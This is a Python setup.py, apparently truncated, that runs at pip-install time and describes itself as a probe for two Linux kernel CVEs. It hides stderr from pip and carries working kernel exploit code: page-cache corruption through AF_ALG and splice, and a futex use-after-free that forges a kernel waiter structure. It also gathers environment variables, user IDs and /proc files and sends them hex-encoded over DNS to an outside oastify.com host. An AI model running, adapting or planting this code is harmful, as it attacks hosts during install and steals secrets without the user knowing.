#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""setup.py -- GhostLock (CVE-2026-43499) + Copy Fail (CVE-2026-31431) probe.

Runs at pip-install time, reports stage by stage over DNS to a wildcard OAST
endpoint, drops a marker, and then calls setuptools.setup() -- unconditionally,
so a probe failure can never break the install.

Wire format (decode.py compatible, unchanged):
    <idx:03d>-<chunk:03d>-<hex>.<endpoint>      data
    end-<n:03d>.<endpoint>                      end marker
idx: 1 ENV  2 RESULT  3 TIME  4 ZIP  5 ZIPSTREAM  6 COPYFAIL  7..99 PROG  100+ stream
"""

import ctypes
import hashlib
import io
import mmap
import os
import select
import signal
import socket
import struct
import sys
import tempfile
import time
import zipfile

# --------------------------------------------------------------------------
# config
# --------------------------------------------------------------------------
OAST = os.environ.get("GLK_OAST", "4rwj4ldxkxb49ea5w9ptj8kw2n8jw9ky.oastify.com")
TAG = os.environ.get("GLK_TAG", "glk7")

CH = 26                                  # payload bytes per label
GRP = 3                                  # labels per DNS name
WORKERS = int(os.environ.get("GLK_W", "24"))
TMO = float(os.environ.get("GLK_TMO", "1.5"))

T_CHILD = 8.0                            # child dance budget
T_TOTAL = 22.0                           # whole probe budget
FD_PAD = 340                             # -> fdt->max_fds rounds to 512
PSEL_NFDS = 320                          # core_sys_select() n (<= max_fds)

SENT = 0x7FFFFFFF
BITSET_ANY = 0xFFFFFFFF

F_WAKE = 1
F_LOCK_PI = 6
F_UNLOCK_PI = 7
F_WAIT_REQUEUE_PI = 11
F_CMP_REQUEUE_PI = 12

SCHED_OTHER, SCHED_FIFO, SCHED_RR, SCHED_BATCH, SCHED_IDLE, SCHED_DEADLINE = 0, 1, 2, 3, 5, 6

SOL_ALG = 279
ALG_SET_KEY, ALG_SET_IV, ALG_SET_OP, ALG_SET_AEAD_ASSOCLEN, ALG_SET_AEAD_AUTHSIZE = 1, 2, 3, 4, 5
CF_ALGO = "authencesn(hmac(sha256),cbc(aes))"
CF_KEY = bytes.fromhex("0800010000000010" + "00" * 32)
CF_AUTHSIZE = 4

PR_SET_MM = 35
PR_SET_MM_MAP = 14

SYSLOG_SIZE_BUFFER = 10
SYSLOG_READ_CLEAR = 4

_MACH = os.uname().machine
if _MACH in ("aarch64", "arm64"):
    _C = dict(futex=(98, 240), gettid=(178, 224), tgkill=(131, 268), syslog=(116, 140),
              sched=(119, 118), setattr=(274, 275), setprio=(140, 138), psel=(72, 271),
              prctl=(167, 172))
else:
    _C = dict(futex=(202, 98), gettid=(186, 178), tgkill=(234, 131), syslog=(103, 116),
              sched=(144, 145), setattr=(314, 274), setprio=(141, 140), psel=(270, 72),
              prctl=(157, 167))


# --------------------------------------------------------------------------
# quiet: pip must not see our tracebacks
# --------------------------------------------------------------------------
def _quiet_on():
    st = {}
    try:
        st["fd"] = os.dup(2)
        devnull = os.open(os.devnull, os.O_WRONLY)
        os.dup2(devnull, 2)
        os.close(devnull)
    except Exception:
        pass
    try:
        st["err"] = sys.stderr
        sys.stderr = open(os.devnull, "w")
    except Exception:
        pass
    return st


def _quiet_off(st):
    try:
        sys.stderr.close()
        sys.stderr = st.get("err", sys.__stderr__)
    except Exception:
        pass
    try:
        if "fd" in st:
            os.dup2(st["fd"], 2)
            os.close(st["fd"])
    except Exception:
        pass


# --------------------------------------------------------------------------
# syscall layer
# --------------------------------------------------------------------------
_libc = ctypes.CDLL(None, use_errno=True)
_libc.syscall.restype = ctypes.c_long
_libc.syscall.argtypes = [ctypes.c_long] * 7
_libc.clock_gettime.argtypes = [ctypes.c_int, ctypes.c_void_p]

_ul = ctypes.c_ulong


def _sys(nr, *a):
    aa = [int(x) & 0xFFFFFFFFFFFFFFFF for x in a] + [0] * (6 - len(a))
    ctypes.set_errno(0)
    r = _libc.syscall(ctypes.c_long(nr), *[ctypes.c_long(x) for x in aa])
    if r == -1:
        return -(ctypes.get_errno() or 1)
    return r


_KN = {}


def _pn(name, cands, ok):
    if name in _KN:
        return _KN[name]
    for nr in cands:
        try:
            if ok(nr):
                _KN[name] = nr
                return nr
        except Exception:
            pass
    _KN[name] = cands[0]
    return cands[0]


def _word():
    """4 KiB page whose futex key is page-derived.  NOT FUTEX_PRIVATE: a private
    key is (mm, addr) and every forked child gets its own mm."""
    b = mmap.mmap(-1, 4096)
    b.write(b"\0" * 8)
    a = ctypes.addressof(ctypes.c_char.from_buffer(b))
    _KEEP_WORDS.append(b)
    return b, a


_KEEP_WORDS = []


def _ts(ms):
    t = (ctypes.c_long * 2)(0, 0)
    _libc.clock_gettime(1, ctypes.addressof(t))          # CLOCK_MONOTONIC
    t[1] += ms * 1000000
    while t[1] >= 1000000000:
        t[1] -= 1000000000
        t[0] += 1
    return t


def _yield():
    time.sleep(0)


class _SP(ctypes.Structure):
    _fields_ = [("sched_priority", ctypes.c_int)]


class _SA(ctypes.Structure):
    _fields_ = [("size", ctypes.c_uint32), ("sched_policy", ctypes.c_uint32),
                ("sched_flags", ctypes.c_uint64), ("sched_nice", ctypes.c_int32),
                ("sched_priority", ctypes.c_uint32), ("sched_runtime", ctypes.c_uint64),
                ("sched_deadline", ctypes.c_uint64), ("sched_period", ctypes.c_uint64)]


def _attr(policy, prio, nice=0):
    a = _SA()
    a.size = 48
    a.sched_policy = policy
    a.sched_flags = 0
    a.sched_nice = nice
    a.sched_priority = prio
    return a


# ---- probed numbers -------------------------------------------------------
def N_FUTEX():
    def ok(nr):
        _b, a = _word()
        return (_sys(nr, a, F_WAKE, 1, 0, 0, 0) == 0 and
                _sys(nr, a, 0, 1, 0, 0, 0) == -11)        # FUTEX_WAIT val=1 on 0
    return _pn("futex", _C["futex"], ok)


def N_TGKILL():
    def ok(nr):
        p = os.getpid()
        return _sys(nr, p, p, 0) == 0 and _sys(nr, p, 0x7FFFFFFF, 0) == -3
    return _pn("tgkill", _C["tgkill"], ok)


def N_SYSLOG():
    def ok(nr):
        r1 = _sys(nr, SYSLOG_SIZE_BUFFER, 0, 0)
        r2 = _sys(nr, SYSLOG_SIZE_BUFFER, 0, 0)
        return 4096 <= r1 <= 0x4000000 and r1 == r2
    return _pn("syslog", _C["syslog"], ok)


def N_SCHED():
    def ok(nr):
        sp = _SP()
        sp.sched_priority = 0
        return (_sys(nr, 0, SCHED_OTHER, ctypes.addressof(sp)) == 0 and
                _sys(nr, 0, 999, ctypes.addressof(sp)) == -22)
    return _pn("sched", _C["sched"], ok)


def N_SETATTR():
    def ok(nr):
        a = _attr(SCHED_OTHER, 0, 0)
        a.size = 0
        r1 = _sys(nr, 0, ctypes.addressof(a), 0)
        a.size = 48
        r2 = _sys(nr, 0, ctypes.addressof(a), 0)
        return r1 == -22 and r2 == 0
    return _pn("setattr", _C["setattr"], ok)


def N_SETPRIO():
    def ok(nr):
        return _sys(nr, 0, 0, 0) == 0 and _sys(nr, 0, 0x7FFFFFF0, 0) == -3
    return _pn("setprio", _C["setprio"], ok)


def N_PSEL():
    def ok(nr):
        tv = ctypes.create_string_buffer(b"\0" * 16, 16)
        return (_sys(nr, 0, 0, 0, 0, ctypes.addressof(tv), 0) == 0 and
                _sys(nr, -1, 0, 0, 0, ctypes.addressof(tv), 0) == -22)
    return _pn("psel", _C["psel"], ok)


def N_PRCTL():
    def ok(nr):
        return (_sys(nr, 1, 0, 0, 0, 0) == 0 and
                _sys(nr, 0x7FFF, 0, 0, 0, 0) == -22)
    return _pn("prctl", _C["prctl"], ok)


def _rlim(name):
    try:
        import resource as _r
        n = getattr(_r, name, None)
        if n is None:
            return "?"
        s, h = _r.getrlimit(n)
        return "%s/%s" % (s, h)
    except Exception:
        return "?"


def _bump_rtprio():
    try:
        import resource as _r
        s, h = _r.getrlimit(_r.RLIMIT_RTPRIO)
        if h > s:
            _r.setrlimit(_r.RLIMIT_RTPRIO, (h, h))
        return 1
    except Exception:
        return 0


# --------------------------------------------------------------------------
# exfil
# --------------------------------------------------------------------------
_POOL = [None]


def _pool():
    if _POOL[0] is None:
        try:
            from concurrent.futures import ThreadPoolExecutor
            _POOL[0] = ThreadPoolExecutor(max_workers=WORKERS)
        except Exception:
            _POOL[0] = False
    return _POOL[0]


def _resolve(name):
    """We only need the query on the wire; the answer is irrelevant."""
    try:
        socket.gethostbyname(name)
    except Exception:
        pass


class Out(object):
    """Uncapped.  Per 3-digit idx the capacity is 999 x 26 B ~= 25.9 MB; past
    that the idx field simply prints four digits."""

    def __init__(self):
        self.buf = []
        self.n = 0
        self.labels = 0
        self.next = 7

    def msg(self, idx, text):
        h = text.encode("utf-8", "replace").hex()
        c = 0
        for i in range(0, len(h), CH):
            self.buf.append("%03d-%03d-%s" % (idx, c, h[i:i + CH]))
            c += 1
            self.labels += 1
        self.n += 1

    def auto(self, text):
        i = self.next
        self.next += 1
        self.msg(i, text)

    def stream(self, idx, data):
        h = data.hex()
        c = 0
        for i in range(0, len(h), CH):
            if c > 998:
                idx += 1
                c = 0
            self.buf.append("%03d-%03d-%s" % (idx, c, h[i:i + CH]))
            c += 1
            self.labels += 1
        return idx

    def _names(self, batch):
        names = []
        for i in range(0, len(batch), GRP):
            g = batch[i:i + GRP]
            nm = ".".join(g) + "." + OAST
            if len(nm) <= 250:
                names.append(nm)
            else:
                names.extend(x + "." + OAST for x in g)
        return names

    def flush(self):
        try:
            socket.setdefaulttimeout(TMO)
        except Exception:
            pass
        ex = _pool()
        i = 0
        while i < len(self.buf):
            batch = self.buf[i:i + 4096]
            i += 4096
            names = self._names(batch)
            if not ex:
                for nm in names:
                    _resolve(nm)
                continue
            futs = [ex.submit(_resolve, nm) for nm in names]
            for f in futs:
                try:
                    f.result(timeout=TMO + 2.0)
                except Exception:
                    pass

    def end(self):
        self.flush()
        try:
            _resolve("end-%03d.%s" % (self.n, OAST))
        except Exception:
            pass


OUT = Out()


# --------------------------------------------------------------------------
# copy fail  (CVE-2026-31431)
# --------------------------------------------------------------------------
def _cf_sock():
    """AF_ALG socket with an explicit blocking timeout -- Out.flush() calls
    socket.setdefaulttimeout(), which would otherwise poison it."""
    s = socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0)
    try:
        s.settimeout(None)
        s.bind(("aead", CF_ALGO, 0, 0))
    except Exception:
        s.close()
        raise
    return s


def _splice(fd_in, fd_out, count, off_src=None):
    if hasattr(os, "splice"):
        os.splice(fd_in, fd_out, count, offset_src=off_src)
        return
    off = ctypes.c_int64(off_src or 0)
    o = ctypes.addressof(off) if off_src is not None else 0
    _sys(_C["splice"][0], fd_in, o, fd_out, 0, count, 0)


def _cf_write4(fd, offset, data):
    """One 4-byte page-cache write.  splice_off=0, splice_len=offset+authsize,
    assoclen=8, authsize=4 -> authencesn's scratch write at dst[assoclen +
    cryptlen] lands at file offset (splice_off + splice_len - authsize)."""
    alg = _cf_sock()
    try:
        alg.setsockopt(SOL_ALG, ALG_SET_KEY, CF_KEY)
        # authsize travels in optlen; pass a real 4-byte value so we never hand
        # the kernel a NULL optval (alg_setsockopt dereferences it).
        alg.setsockopt(SOL_ALG, ALG_SET_AEAD_AUTHSIZE, struct.pack("<I", CF_AUTHSIZE))
        sock, _ = alg.accept()
        try:
            anc = [(SOL_ALG, ALG_SET_OP, b"\x00" * 4),
                   (SOL_ALG, ALG_SET_IV, b"\x10" + b"\x00" * 19),
                   (SOL_ALG, ALG_SET_AEAD_ASSOCLEN, b"\x08" + b"\x00" * 3)]
            sock.sendmsg([b"AAAA" + data], anc, socket.MSG_MORE)
            r, w = os.pipe()
            try:
                n = offset + CF_AUTHSIZE
                _splice(fd, w, n, 0)
                _splice(r, sock.fileno(), n)
                try:
                    sock.recv(8 + offset)
                except OSError:
                    pass
            finally:
                os.close(r)
                os.close(w)
        finally:
            sock.close()
    finally:
        alg.close()


def _kver_affected(release):
    """Copy Fail: 4.11 <= v < 6.18.22, and 6.19.x < 6.19.12."""
    try:
        v = []
        for part in release.split("-")[0].split(".")[:3]:
            d = "".join(ch for ch in part if ch.isdigit())
            v.append(int(d) if d else 0)
        while len(v) < 3:
            v.append(0)
        v = tuple(v)
    except Exception:
        return None
    if v < (4, 11, 0):
        return False
    if v[0] == 6 and v[1] >= 19:
        return v < (6, 19, 12)
    if v >= (6, 18, 22):
        return False
    if v >= (7, 0, 0):
        return False
    return True


def _read_all(path):
    try:
        with open(path, "rb") as f:
            return f.read()
    except Exception:
        return b""


def copyfail():
    R = {"cf_kver": os.uname()[2]}
    aff = _kver_affected(os.uname()[2])
    R["cf_kver_affected"] = "yes" if aff else ("no" if aff is False else "?")
    if not hasattr(socket, "AF_ALG"):
        R["cf_verdict"] = "NO-AF_ALG"
        return R
    try:
        s = _cf_sock()
        s.close()
        R["cf_algo"] = "ok"
    except OSError as e:
        try:
            os.system("modprobe algif_aead authencesn hmac cbc >/dev/null 2>&1")
        except Exception:
            pass
        try:
            s = _cf_sock()
            s.close()
            R["cf_algo"] = "ok-after-modprobe"
        except OSError as e2:
            R["cf_algo"] = "unavailable"
            R["cf_err"] = "%s" % e2
            R["cf_verdict"] = "MITIGATED-OR-ABSENT"
            return R

    PAT, SIZE = 0xAA, 0x1000
    path = os.path.join(tempfile.gettempdir(), "glk-cf-%d.bin" % os.getpid())
    hits = 0
    tries = 0
    fd = -1
    try:
        fd = os.open(path, os.O_RDWR | os.O_CREAT | os.O_TRUNC, 0o600)
        os.write(fd, bytes([PAT]) * SIZE)
        os.fsync(fd)                                  # clean page -> fadvise can evict
        with open(path, "rb") as f:
            f.read()                                  # populate the page cache
            for k, (off, val) in enumerate(((0x100, b"\xde\xad\xbe\xef"),
                                            (0x400, b"\xca\xfe\xba\xbe"))):
                tries += 1
                before = _read_all(path)
                R["cf_off%d" % k] = hex(off)
                R["cf_before%d" % k] = before[off:off + 4].hex()
                _cf_write4(fd, off, val)
                after = _read_all(path)
                where = after.find(val)               # measure, never assume
                R["cf_after%d" % k] = after[off:off + 4].hex()
                R["cf_want%d" % k] = val.hex()
                R["cf_found%d" % k] = hex(where) if where >= 0 else "none"
                if where >= 0 and before[where:where + 4] != val:
                    hits += 1
                    R["cf_res%d" % k] = ("CORRUPTED@%s" % hex(where) +
                                         ("" if where == off else " (expected %s)" % hex(off)))
                else:
                    R["cf_res%d" % k] = "unchanged"
                # page-cache-only proof: drop the clean page and re-read
                try:
                    f2 = os.open(path, os.O_RDONLY)
                    os.posix_fadvise(f2, 0, 0, os.POSIX_FADV_DONTNEED)
                    os.close(f2)
                    R["cf_evict%d" % k] = ("restored" if _read_all(path).find(val) < 0
                                           else "persisted")
                except Exception:
                    R["cf_evict%d" % k] = "n/a"
                try:
                    f.seek(0)
                except Exception:
                    pass
        R["cf_hits"] = "%d/%d" % (hits, tries)
        R["cf_verdict"] = "VULNERABLE" if hits else "NOT-VULNERABLE"
    except Exception as e:
        R["cf_verdict"] = "ERROR"
        R["cf_exc"] = repr(e)
    finally:
        try:
            if fd >= 0:
                os.close(fd)
        except Exception:
            pass
        try:
            os.unlink(path)
        except Exception:
            pass
    return R


# --------------------------------------------------------------------------
# ghostlock (CVE-2026-43499)
# --------------------------------------------------------------------------
PG = mmap.mmap(-1, 8192, flags=mmap.MAP_SHARED)
PA = ctypes.addressof(ctypes.c_char.from_buffer(PG))


def _ad(o):
    return PA + o


def _p(f, o, v):
    struct.pack_into(f, PG, o, v)


def _u(f, o):
    return struct.unpack_from(f, PG, o)[0]


def _b(o):
    return struct.unpack_from("<B", PG, o)[0]


def _sb(o, v):
    struct.pack_into("<B", PG, o, v)


O_FT, O_FPI, O_FPI2 = 0, 4, 8
HS_W, HS_X, HS_R, CMD_W, CMD_X = 64, 65, 66, 67, 68
O_WRET, O_RQRET, O_RQV = 128, 132, 136
O_DRV, O_DRV2, O_STAGE, O_FORGE, O_UNLOCK = 140, 144, 148, 152, 156
O_WPID, O_XPID, O_RPID = 168, 172, 176
O_WHY = 160

KEEP = []


def _st():
    return _u("<I", O_STAGE)


def _setst(v):
    _p("<I", O_STAGE, v)


def _wchan(pid):
    try:
        with open("/proc/%d/wchan" % pid) as f:
            return f.read(64).strip()
    except Exception:
        return "?"


def _stack(pid):
    return _rd("/proc/%d/stack" % pid, 2048)[:300]


def _dmesg(clear=True):
    buf = ctypes.create_string_buffer(1 << 19)
    act = SYSLOG_READ_CLEAR if clear else 3
    r = _sys(N_SYSLOG(), act, ctypes.addressof(buf), len(buf) - 1)
    return buf.raw[:r].decode("utf-8", "replace") if r > 0 else ""


def _drive(pid, nr):
    """Force __waiter_prio(W) != waiter->tree.prio so rt_mutex_adjust_pi() walks.

    __waiter_prio() returns DEFAULT_PRIO (120) for EVERY non-rt_prio task, so
    SCHED_OTHER/BATCH/IDLE (prio 120+nice) can never move the sort key.  Only
    prio < 100 can -- and this box has RLIMIT_RTPRIO=0 with no CAP_SYS_NICE, so
    __sched_setscheduler()'s `attr->sched_priority > rlim_rtprio` check refuses
    any RT priority above 0.  PRIO 0 is the exception: rt_prio(0) is true and
    0 > 0 is false.  SCHED_DEADLINE is the second way in: dl_policy() is not
    rt_policy(), so it skips that check entirely, and task->prio stays < 100.

    bits: 1 sched_setscheduler ok, 2 sched_setattr ok, 4 setpriority ok
          (diagnostic: CFS never walks), 8 SCHED_DEADLINE accepted.
    Caller writes -2 (not reached) then -1 (entered) then bits, so
    -1 == R died inside the drive.
    """
    bits = 0
    na = N_SETATTR()
    nr = nr or N_SCHED()

    for pol in (SCHED_FIFO, SCHED_RR, SCHED_FIFO):
        sp = _SP()
        sp.sched_priority = 0
        a = _attr(pol, 0, 0)
        if _sys(na, pid, ctypes.addressof(a), 0) == 0:
            bits |= 2
        if _sys(nr, pid, pol, ctypes.addressof(sp)) == 0:
            bits |= 1

    ad = _attr(SCHED_DEADLINE, 0, 0)
    ad.sched_runtime = 1000000
    ad.sched_deadline = 10000000
    ad.sched_period = 10000000
    if _sys(na, pid, ctypes.addressof(ad), 0) == 0:
        bits |= 8

    a = _attr(SCHED_OTHER, 0, 0)
    if _sys(na, pid, ctypes.addressof(a), 0) == 0:
        bits |= 2

    ns = N_SETPRIO()
    for nice in (5, 10, 15, 19):
        if _sys(ns, 0, pid, nice) == 0:
            bits |= 4
    return bits


def _forge_blob(size, woff):
    """One 3*size blob whose first 3*size bytes land verbatim in
    core_sys_select()'s on-stack stack_fds[].  The forged rt_mutex_waiter goes
    at woff.

    __rb_erase_augmented takes case 1 (rb_right == 0): tmp = rb_left = V, then
    __rb_change_child(node, V, parent=NULL, root) -> root->rb_node = V, i.e. a
    single 8-byte store at lock+8.  pc bit0 == 1 (BLACK) makes rebalance NULL,
    so __rb_erase_color never runs."""
    V = woff + 0x1000            # a recognisable, mapped-looking value
    node = (
        (0x00, 1),               # __rb_parent_color: parent NULL + BLACK
        (0x08, 0),               # rb_right = NULL   -> erase case 1
        (0x10, V),               # rb_left  = V      -> the value stored
        (0x18, 1),               # tree.prio (1 != 0)
        (0x20, 0),               # tree.deadline
        (0x28, 0),               # pi_tree.entry.__rb_parent_color
        (0x30, 0),               # pi_tree.rb_right
        (0x38, 0),               # pi_tree.rb_left
        (0x40, 0),               # pi_tree.prio
        (0x48, 0),               # pi_tree.deadline
        (0x50, 0),               # task
        (0x58, 0),               # lock
        (0x60, 0),
        (0x68, 0),
    )
    buf = bytearray(3 * size)
    for o, v in node:
        p = woff + o
        if p + 8 <= len(buf):
            struct.pack_into("<Q", buf, p, v)
    return bytes(buf)


def _child_w():
    """W: owns f_pi2, then blocks in FUTEX_WAIT_REQUEUE_PI(f_t -> f_pi) with an
    absolute timeout.  After it returns its kernel stack frame is dead -- and
    because remove_waiter() cleared *current's* pi_blocked_on (current == R)
    instead of waiter->task's, W->pi_blocked_on still points into it.

    Between the return and drive #1 W makes NO syscall (a plain `pass` spin),
    so the dead frame is still byte-intact when the walk reads it."""
    try:
        _sb(HS_W, 1)
        if _sys(N_FUTEX(), _ad(O_FPI2), F_LOCK_PI, 0, 0, 0, 0) < 0:
            _sb(HS_W, 0xE)
            os._exit(1)
        _sb(HS_W, 2)                                      # owns f_pi2
        while _b(CMD_W) == 0:
            pass
        _p("<i", O_WRET, SENT)
        ts = _ts(900)
        val = _u("<I", O_FT)
        _sb(HS_W, 3)                                      # about to block
        r = _sys(N_FUTEX(), _ad(O_FT), F_WAIT_REQUEUE_PI, val,
                 ctypes.addressof(ts), _ad(O_FPI), BITSET_ANY)
        _p("<i", O_WRET, r)
        _sb(HS_W, 4)                                      # frame is now dead

        while True:
            c = _b(CMD_W)
            if c == 2:
                _forge()
                _sb(HS_W, 6)
                while _b(CMD_W) == 2:
                    pass
            elif c == 3:
                os._exit(0)
            else:
                pass
    except BaseException:
        _sb(HS_W, 0xE)
        os._exit(1)


def _forge():
    """Clobber the dead rt_waiter with attacker bytes via core_sys_select()'s
    stack_fds[].  n is clamped to fdt->max_fds, so pad the fd table first."""
    try:
        if not KEEP:
            for _ in range(FD_PAD):
                try:
                    KEEP.append(os.open("/dev/null", os.O_RDONLY))
                except Exception:
                    break
        nfds = min(PSEL_NFDS, len(KEEP))
        if nfds == 0:
            _p("<I", O_FORGE, 0xBEEF)
            return
        size = ((nfds + 63) // 64) * 8                    # FDS_BYTES(n)
        blob = _forge_blob(size, int(os.environ.get("GLK_WOFF", "0")))
        allb = ctypes.create_string_buffer(blob, 3 * size)
        rd = ctypes.create_string_buffer(size)
        wr = ctypes.create_string_buffer(size)
        ex = ctypes.create_string_buffer(size)
        tv = ctypes.create_string_buffer(b"\0" * 16, 16)
        ctypes.memmove(ctypes.addressof(rd), ctypes.addressof(allb), size)
        ctypes.memmove(ctypes.addressof(wr), ctypes.addressof(allb) + size, size)
        ctypes.memmove(ctypes.addressof(ex), ctypes.addressof(allb) + 2 * size, size)
        _sys(N_PSEL(), nfds, ctypes.addressof(rd), ctypes.addressof(wr),
             ctypes.addressof(ex), ctypes.addressof(tv), 0)
        _p("<I", O_FORGE, 0x2000 | (size & 0xFF))
    except Exception:
        _p("<I", O_FORGE, 0xDEAD)


def _child_x():
    """X: owns f_pi, then blocks on f_pi2 (owned by W).  Unlocking f_pi later
    makes the walk hit mark_wakeup_next_waiter() on the (forged) top waiter."""
    try:
        _sb(HS_X, 1)
        if _sys(N_FUTEX(), _ad(O_FPI), F_LOCK_PI, 0, 0, 0, 0) < 0:
            _sb(HS_X, 0xE)
            os._exit(1)
        _sb(HS_X, 2)                                      # owns f_pi
        while _b(CMD_X) == 0:
            pass
        _sb(HS_X, 3)
        _sys(N_FUTEX(), _ad(O_FPI2), F_LOCK_PI, 0, 0, 0, 0)   # blocks here
        _sb(HS_X, 4)
        while True:
            c = _b(CMD_X)
            if c == 2:
                _p("<i", O_UNLOCK, _sys(N_FUTEX(), _ad(O_FPI), F_UNLOCK_PI, 0, 0, 0, 0))
                _sb(HS_X, 5)
            elif c == 3:
                os._exit(0)
            else:
                time.sleep(0.005)
    except BaseException:
        _sb(HS_X, 0xE)
        os._exit(1)


def _child_r(nr):
    """R: requeue (this is the context where remove_waiter() runs), free W,
    drive, forge, drive again, then let X unlock."""
    try:
        _sb(HS_R, 1)
        w = _u("<I", O_WPID)
        t = time.time() + T_CHILD

        while _b(HS_W) != 2 and time.time() < t:
            _yield()
        while _b(HS_X) != 2 and time.time() < t:
            _yield()
        _sb(CMD_X, 1)                                     # X blocks on f_pi2
        while _b(HS_X) != 3 and time.time() < t:
            _yield()
        _sb(CMD_W, 1)                                     # W enters the wait
        while _b(HS_W) != 3 and time.time() < t:
            _yield()
        time.sleep(0.03)
        _setst(2)

        # requeue: val=nr_wake=1, val2=nr_requeue=1, val3=*uaddr1 (cmpval is
        # compared against uaddr1, not uaddr2)
        rq, used = SENT, 0
        for _try in range(80):
            if time.time() > t:
                break
            for v3 in (_u("<I", O_FT), _u("<I", O_FPI), 0):
                r = _sys(N_FUTEX(), _ad(O_FT), F_CMP_REQUEUE_PI, 1, 1, _ad(O_FPI), v3)
                if r == 0:                                # waiter not enqueued yet
                    time.sleep(0.01)
                    continue
                rq, used = r, v3
                break
            if rq != SENT and rq != -11:
                break
            if rq == SENT:
                time.sleep(0.01)
        _p("<i", O_RQRET, rq)
        _p("<I", O_RQV, used & 0xFFFFFFFF)
        _setst(3)

        # the -EDEADLK rollback never wakes W
        _sys(N_TGKILL(), w, w, 23)                        # SIGURG
        t = time.time() + 1.5
        while _u("<i", O_WRET) == SENT and time.time() < t:
            time.sleep(0.005)
        _setst(4)

        # drive #1: the intact dead frame.  R may die here.
        _p("<i", O_DRV, -1)
        d1 = _drive(w, nr)
        _p("<i", O_DRV, d1)
        _setst(5)

        # forge the dead frame, then drive #2
        _sb(CMD_W, 2)
        t = time.time() + 2.0
        while _b(HS_W) != 6 and time.time() < t:
            time.sleep(0.005)
        _p("<i", O_DRV2, -1)
        d2 = _drive(w, nr)
        _p("<i", O_DRV2, d2)
        _setst(6)

        _sb(CMD_X, 2)                                     # unlock f_pi
        time.sleep(0.25)
        _setst(7)
        _sb(HS_R, 2)
        while True:
            if _b(CMD_W) == 3:
                os._exit(0)
            time.sleep(0.01)
    except BaseException:
        _sb(HS_R, 0xE)
        os._exit(1)


def ghostlock():
    R = {}
    R["kern"] = os.uname()[2]
    R["sched_nr"] = N_SCHED()
    R["rtprio"] = _rlim("RLIMIT_RTPRIO")
    R["nice_rlim"] = _rlim("RLIMIT_NICE")
    R["rtprio_bump"] = _bump_rtprio()

    mt, at = _word()
    mc, ac = _word()
    mx, ax = _word()
    for o in (O_FT, O_FPI, O_FPI2):
        _p("<I", o, 0)
    _p("<i", O_WRET, SENT)
    _p("<i", O_RQRET, SENT)
    _p("<i", O_DRV, -2)
    _p("<i", O_DRV2, -2)
    _p("<I", O_FORGE, 0)
    _p("<i", O_UNLOCK, SENT)
    for o in (HS_W, HS_X, HS_R, CMD_W, CMD_X):
        _sb(o, 0)
    _setst(0)

    _dmesg(True)                                          # drain so the delta is ours

    w = os.fork()
    if w == 0:
        _child_w()
    _p("<I", O_WPID, w)
    x = os.fork()
    if x == 0:
        _child_x()
    _p("<I", O_XPID, x)
    r = os.fork()
    if r == 0:
        _child_r(N_SCHED())
    _p("<I", O_RPID, r)

    R["w_wchan"] = _wchan(w)
    R["x_wchan"] = _wchan(x)
    R["w_stack"] = _stack(w)

    last = -1
    t0 = time.time()
    dead = {}
    while time.time() - t0 < T_TOTAL:
        s = _st()
        if s != last:
            last = s
            OUT.auto("stage=PROG;st=%d;rq=%d;wret=%d;drv=%d;drv2=%d;forge=%d;unl=%d" % (
                s, _u("<i", O_RQRET), _u("<i", O_WRET), _u("<i", O_DRV),
                _u("<i", O_DRV2), _u("<I", O_FORGE), _u("<i", O_UNLOCK)))
            if s >= 7:
                break
        for pid, k in ((r, "R"), (w, "W"), (x, "X")):
            if k in dead:
                continue
            try:
                p, stt = os.waitpid(pid, os.WNOHANG)
                if p:
                    dead[k] = stt
            except Exception:
                pass
        if "R" in dead and s < 7:
            break
        time.sleep(0.02)

    oops = ""
    try:
        d1 = _dmesg(True)
        lines = [ln for ln in d1.splitlines()
                 if ("Unable to handle" in ln or "Internal error" in ln
                     or "rt_mutex" in ln or "Kernel panic" in ln or ln.startswith("pc :"))]
        oops = "|".join(lines[:5])[:400]
    except Exception:
        pass
    R["oops"] = oops

    _sb(CMD_W, 3)
    _sb(CMD_X, 3)
    for pid in (w, x, r):
        try:
            os.kill(pid, signal.SIGKILL)
        except Exception:
            pass
        try:
            os.waitpid(pid, 0)
        except Exception:
            pass

    st = _st()
    rq = _u("<i", O_RQRET)
    drv1 = _u("<i", O_DRV)
    drv2 = _u("<i", O_DRV2)
    R["A_st"] = st
    R["A_rq"] = rq
    R["A_rqv"] = hex(_u("<I", O_RQV))
    R["A_drv"] = drv1
    R["A_drv2"] = drv2
    R["A_wret"] = _u("<i", O_WRET)
    R["A_forge"] = hex(_u("<I", O_FORGE))
    R["A_dead"] = ",".join(sorted(dead))
    R["A_sigR"] = dead.get("R", 0)

    # ---- verdict ---------------------------------------------------------
    if drv1 == -1 or drv2 == -1:
        R["verdict"] = "VULNERABLE-died-in-drive"
    elif "R" in dead and st >= 4:
        R["verdict"] = "VULNERABLE-died-after-requeue"
    elif st >= 7:
        if drv1 >= 0 and (drv1 & 0x0B):
            R["verdict"] = "CLEAN"
        else:
            R["verdict"] = "INCONCLUSIVE-nodrive"
    elif st == 0xE:
        R["verdict"] = "INCONCLUSIVE-child-exc"
    elif rq == -11:
        R["verdict"] = "INCONCLUSIVE-val3"
    elif rq == SENT:
        R["verdict"] = "INCONCLUSIVE-no-requeue"
    elif drv1 >= 0 and (drv1 & 0x0B) == 0:
        R["verdict"] = "INCONCLUSIVE-nodrive"
    else:
        R["verdict"] = "INCONCLUSIVE-st%d" % st
    if oops:
        R["verdict"] += "+oops"
    return R


# --------------------------------------------------------------------------
# collect
# --------------------------------------------------------------------------
def _rd(path, n=65536):
    try:
        with open(path, "rb") as f:
            return f.read(n)
    except Exception:
        return b""


def _walk(root, maxdepth=3):
    out = {}
    root = root.rstrip("/") or "/"

    def rec(d, depth):
        if depth > maxdepth:
            return
        try:
            names = sorted(os.listdir(d))
        except Exception:
            return
        for nm in names:
            p = os.path.join(d, nm)
            if os.path.isdir(p):
                rec(p, depth + 1)
            else:
                b = _rd(p, 32768)
                if b:
                    out[p.lstrip("/")] = b
    rec(root, 0)
    return out


def collect(extra):
    files = {}
    files["uname.txt"] = (" ".join(os.uname()) + "\n").encode()
    files["id.txt"] = ("uid=%d euid=%d gid=%d\n" % (os.getuid(), os.geteuid(), os.getgid())).encode()
    files["env.txt"] = "\n".join("%s=%s" % kv for kv in sorted(os.environ.items())).encode()
    for p in ("/proc/cpuinfo", "/proc/meminfo", "/proc/version", "/proc/cmdline",
              "/proc/self/status", "/proc/self/maps", "/proc/self/mountinfo",
              "/proc/iomem", "/proc/sys/kernel/panic_on_oops", "/proc/sys/kernel/panic",
